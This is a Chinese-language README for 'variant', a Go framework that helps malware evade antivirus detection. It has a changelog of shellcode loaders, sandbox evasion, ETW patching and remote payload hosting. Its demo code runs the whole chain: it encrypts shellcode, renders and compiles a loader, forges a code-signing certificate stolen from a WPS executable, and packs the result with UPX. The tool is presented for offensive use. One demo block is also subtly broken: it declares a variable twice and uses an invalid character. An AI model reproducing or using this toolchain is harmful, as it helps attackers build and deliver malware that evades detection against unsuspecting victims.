# variant

Go Anti-Virus Framework

## Description

本项目会不断添加各种免杀的技术，但是**不适合直接不做任何修改的编译和使用**，即使是有随机特征的编译

### 特别说明

1. 本项目没有 `GUI` 版本，**使用方法查看demo文件夹**
2. 学习Go免杀的代码集合，顺手做了模块化处理，**实际开发未结束，还在持续更新**
3. 最好的免杀效果需要自行修改渲染编译模板

### 更新日志

### 2024.2.28

1. `remote`模块改名为`network`
2. 新增多种加密：`elliptic_curve`，`morse`，`pokemon`，`rot13`，`rot47`
3. 模板更新`V4 Base.tmpl`：兼容全部渲染方式（参数加载暂时除外）
4. 加载模块更新：`ADsMemLoad`
5. `remder`模块同步更新
6. `enc`模块新增：`PokemonStrings`，`pokemon`加密专用方法；修改其他加密的兼容性

### 2024.2.20

1. 新增`loader`：`ipv4`, `macaddress`, `enumsystemlocales + Hell's Gate + Halo's Gate technique`
2. `Dll`模块重构调用方式，特征更新
3. 新增`hook`模块，`Hook函数检测`，`ETW Patch`，`权限检测/提权`

### 2024.2.18

1. 新增`loader`：`EnumerateLoadedModulesLoad`, `EnumChildWindowsLoad`, `EnumPageFilesWLoad`
2. `Dll`模块根据`loader`同步更新
3. 新增`garble`编译参数：`-tiny`
4. 新增构建模式：`-buildmode`，详情执行`go help buildmode`查看
5. 新增`FileAnalyzer`方法，计算文件的特征：`entropy`, `md5`, `sha1`, `sha256`, `sha512`

### 2024.2.7

1. 新增`garble(需安装)`编译，支持`-seed, -literals, -debug`，但会导致编译的文件体积增大和熵值增加
2. 重构编译模块，现在支持`原生go编译, garble编译`
3. 调整编译的流程和日志输出逻辑
4. 重构`Upx`模块，支持自定义`Upx.exe`的路径
5. 重构`Winres`模块，现在使用`HandleWinRes`方法可以直接添加图标
6. 预计新增Go编译器： [llvm](https://github.com/llvm/llvm-project/tree/llvmorg-17.0.6), [tinygo](https://github.com/tinygo-org/tinygo) - 实验性
7. 新增`install.bat`，初始化工具

### 2024.2.6

1. 新增两种远程加载的方式`UsersCloud, file.io (web)`
2. 新增`github.com/imroc/req/v3`的请求客户端
3. 优化远程加载模块的函数描述
4. 简化远程模块上传加密文件的结构体
5. 模板更新，兼容新的远程加载方式

### 2024.2.5

1. 新增参数加载模块，可以自定义(随机)密钥
2. 模板简化，兼容所有模块的渲染
3. 渲染模块优化，兼容所有模块的调用
4. 新增远程加载模块，远程加密数据的上传会在渲染阶段完成，上传(`curl:已完成, web:开发中...`)支持代理
5. 新增动态数据模块可以和任意加载方式联动
6. 新增上传加密`Payload`随机化
7. 新增`loader:earlybird`

### 2024.2.4

1. 新增动态获取解密数据的模块 - `Dynamic: payload, key, iv`
2. 按照本地、远程、参数加载的方式重构，减少模板渲染的复杂度
3. 新增分离加载模块
4. 渲染模板优化

### 2024.1.30

1. `lzw`压缩导致熵值上升到`7.0+`；测试`fmt.Printf("Hello World")`编译后熵值在`6.0-6.1`之间，压缩模块下次一定
2. 远程加载：模块、模板、配置更新
3. 重构加密模块，利用反射根据传入的方法签名判断加密
4. 使用`windows package`重写了`DLL`调用模块，[`syscall`&`windows`的总结](https://c1ph3rx13.github.io/posts/2024-01-30/The-low-level-Operating-System-Primitives/)
5. 模板新增根据自定义导入对应库设置
6. 新增多个多重加密/编码方法，`Base32/62`编码测试熵值比较低

### 2024.1.29

1. 新增渲染判断，模板可根据结构体来渲染
2. 更改为验证为沙箱之后程序正常退出
3. 新增代码检查：检查通过再编译；初始化：`go install golang.org/x/tools/cmd/goimports@latest`
4. 细化结构体：根据功能区分
5. 新增压缩算法：`lzw`, `zstd`；熵值模块
6. 新增动态方法：`GetSelfSHA256Nth`
7. 优化代码逻辑

### 2024.1.27

1. 模块化配置
2. 模板渲染
3. 编译控制
4. UPX压缩：需要检查`upx.exe`是否正确放置在`build`文件夹，才能正确初始化
5. 签名伪造
6. 添加图标文件信息：初始化：`go install github.com/tc-hib/go-winres@latest`
7. 模板更新
8. 反沙箱模块

### TODO

1. + [x] 动态`key, iv`
2. + [ ] 熵控制
3. + [ ] 隐藏导入表

## Tmpl Struct

```go
type Data struct {
	CipherText    string      // 保存加密文本的变量名
	PlainText     string      // 保存解密文本的变量名
	Payload       string      // 加密 shellcode
	DecryptMethod string      // 解密方法
	Loader        interface{} // loader
	SandBox       interface{} // 反沙箱模块
	Local         interface{} // 本地加载模块
	Remote        interface{} // 远程加载模块
	Args          interface{} // 参数加载模块
	Compressor    interface{} // 压缩算法模块
	Apart         interface{} // 分离加载模块
	Dynamic       interface{} // 动态数据
}
```

## Compile

### Windows

使用特殊编译参数需要设置的环境变量，推荐设置系统环境变量的方式，使用框架来进行编译

```cmd
// 手动编译，设置临时环境变量
set GOPRIVATE=* 
set GOGARBLE=* 
```

## Remote ShellCode Exec

### UsersCloud

```go
	// 上传远程加载的Payload到第三方
	uc := remote.UsersCloud{
		Path: "output",
		Src:  params.FileName,
	}

	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import:     "variant/remote",
		UCFileCode: uc.UCUpload(),
		UCMethod:   "remote.UCRead",
	}
```

### Transfer

```go
	// 上传远程加载的Payload到第三方
	cUrl := remote.Transfer{
		Src:   params.FileName,
		Path:  "D:\\variant\\output\\",
		Proxy: "192.168.31.10:2080",
	}
	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import:  "variant/remote",
		Url:     cUrl.CurlUpload(),
		Method:  "remote.RestyStrings",
	}
```

### File.io

```go
	// 上传远程加载的Payload到第三方
	fi := remote.FileIO{
		Src:  params.FileName,
		Path: "output",
	}

	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import: "variant/remote",
		Url:    fi.Upload(),
		Method: "remote.FileIORead",
	}
```

## Executable Packer

### Upx

```go
	// 压缩参数
	upx := build.UpxOpts{
		Level:   "--lzma",
		Keep:    true,
		Force:   true,
		SrcExe:  cOpts.ExeFileName,
		SrcPath: "output",
		UpxPath: "build",
	}

	// 执行压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Fatal(err)
	}
```

## Demo

```go
package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
    // 反沙箱模块
	sandbox := render.SandBox{
		Methods: []string{
			"sandbox.BootTime()",
			"sandbox.GetDesktopFiles()",
		}}
    
    // 动态数据
    dy := render.Dynamic{
		Import:        "variant/dynamic",
		DynamicUrl:    "https://www.baidu.com/favicon.ico",
		DynamicMethod: "dynamic.GetIcoHex",
		DynamicKey:    rand.RStrings(),
		KeyStart:      0,
		KeyEnd:        8,
		DynamicIV:     rand.RStrings(),
		IVStart:       10,
		IVEnd:         18,
	}
	
    // 本地加载
	local := render.Local{
		KeyName:  rand.RStrings(),
		KeyValue: rand.LStrings(16),
		IvName:   rand.RStrings(),
		IvValue:  rand.LStrings(16),
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Decrypt:    "XorSm4HexBase85Decrypt",
		Loader:     "UuidFromString",
		Local:      local,
        Dynamic：   dy,
        SandBox:    sandbox,
	}
    
	// 定义模板渲染数据
	data := render.Data{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Decrypt:    "XorSm4HexBase85Decrypt",
		Loader:     "HalosGate",
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		//Key: []byte(local.KeyValue),
		Key: dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd),
		//IV:  []byte(local.IvValue),
		IV:  dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),
	}
	// 加密之后的 shellcode
	tmp, err := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}
	data.Payload = tmp

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: false,
		CompilePath: "output",
	}
	// 编译
	if err = cOpts.Compile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	err = cOpts.Winres()
	if err != nil {
		log.Fatal(err)
	}

	// 伪造证书配置
	sOpts := build.SignOpts{
		SignPath: "output",
		UnSign:   cOpts.ExeFileName,
		Signed:   "signed_" + cOpts.ExeFileName,
		Cert:     "wps.der",
		Thief:    "wps.exe",
		DstCert:  "wps.der",
	}

	// 保存证书
	err = sOpts.SaveCert()
	if err != nil {
		log.Fatal(err)
	}

	// 利用EXE进行签名伪造
	err = sOpts.ExeThief()
	if err != nil {
		log.Fatal(err)
	}

	// 利用证书进行签名伪造
	err = sOpts.CertThief()
	if err != nil {
		log.Fatal(err)
	}

	// 压缩参数
	upx := build.UpxOpts{
		Level:   "-9",
		Keep:    true,
		Force:   true,
		SrcExe:  cOpts.ExeFileName,
		UpxPath: "output",
	}

	// 压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Warn(err)
	}

}
```

### Thanks

https://github.com/Ne0nd0g/go-shellcode

https://github.com/safe6Sec/GolangBypassAV

https://github.com/afwu/GoBypass

https://github.com/piiperxyz/AniYa

https://github.com/wumansgy/goEncrypt

https://github.com/TideSec/GoBypassAV

https://github.com/Pizz33/GobypassAV-shellcode

https://github.com/timwhitez/Doge-Gabh
